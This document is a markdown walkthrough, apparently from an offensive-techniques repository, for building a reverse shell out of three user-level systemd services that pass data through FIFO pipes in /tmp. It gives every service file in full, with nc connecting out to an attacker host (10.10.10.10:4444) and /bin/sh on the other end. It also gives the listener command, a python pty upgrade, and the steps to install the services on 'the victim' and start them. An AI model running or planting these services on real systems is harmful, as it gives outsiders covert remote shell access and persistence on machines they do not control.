# Netcat Without The E

## Description

**NOTE**: This is a reimplementation of Ed Skoudis' "Netcat without -e? No Problem!" blog post.
Unfortunately, it looks like the original blog post has been moved/taken down, but a version on Archive.org still exists.
Link in Additional Notes.

This sequence of commands sets up a reverse shell using two separate services - a `nc` one and a `sh` one -
which interact by sharing FIFO pipes set up in `/tmp`. A third service is used to activate the shell, but it could easily be
replaced by a simple "echo" command on its own.

The shell service file (`revsh.service`) uses:

* The `ExecStart` directive to execute the terminal shell (additional shell redirects can be found in the link below; **not my repository**)
* The `StandardInput` directive uses the FIFO pipe `/tmp/backpipe` as a stream of commands to process
* The `StandardOutput` directive uses the FIFO pipe `/tmp/frontpipe` as a stream to send command output to

The network service file (`revnc.service`) uses:

* The `Environment` directive to set up the remote host and port to connect to
* The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)
* The `StandardInput` directive uses the FIFO pipe `/tmp/frontpipe` as a stream of command output to display to the attacker
* The `StandardOutput` directive uses the FIFO pipe `/tmp/backpipe` as a stream of commands for the shell service to process

The initializer service file (`revinit.service`) uses:

* The `Type` directive to tell systemd it doesn't need to treat this like a daemon
* The `StandardOutput` directive uses the FIFO pipe `/tmp/backpipe` to notify `revsh.service` to activate once data is in its StandardInput file
* The `ExecStart` directive to specify what command to execute in the shell first

## Additional Notes

* [Netcat without -e? No Problem!](https://web.archive.org/web/20190305102845/https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
* The message that initializes the shell simply invokes `bash` in a subshell, which gives the attacker access to tab-completion and various special characters that a regular `sh` would not
* Another way to visualize how the I/O streams are set up is:

  ```sh
                -->  /bin/sh  -->
  /tmp/backpipe |               | /tmp/frontpipe
                <--  /bin/nc  <--
  ```

## Step by Step

1. Stand up listener on attacker server

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
```

2. Generate the service files

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - sh half

[Service]
Type=simple
; https://github.com/fijimunkii/bash-dev-tcp
StandardInput=file:/tmp/backpipe
StandardOutput=file:/tmp/frontpipe
ExecStart=/bin/sh
```

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - nc half

[Service]
Type=simple
; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
StandardInput=file:/tmp/frontpipe
StandardOutput=file:/tmp/backpipe
Environment=RHOST="10.10.10.10" RPORT="4444"
ExecStart=/usr/bin/nc ${RHOST} ${RPORT}
```

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - initializing the pipe

[Service]
Type=oneshot
StandardOutput=file:/tmp/backpipe
ExecStart=/usr/bin/echo "python -c \"import pty;pty.spawn('/bin/bash')\""
```

3. Install services into the systemd user folder on the victim and reload the shell

```sh
$ mkdir -p ~/.config/systemd/user/
$ ln -s `pwd`/revsh.service ~/.config/systemd/user/
$ ln -s `pwd`/revnc.service ~/.config/systemd/user/
$ ln -s `pwd`/revinit.service ~/.config/systemd/user/
$ systemctl --user daemon-reload
```

4. Create the FIFO pipes

```sh
$ mknod --mode=0666 /tmp/backpipe p
$ mknod --mode=0666 /tmp/frontpipe p
```

6. Start the services

```sh
$ systemctl --user start rev*
```

7. Wait for the shell!

```sh
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [${attacker}] from (UNKNOWN) [${victim}]
user@victim:~$
```
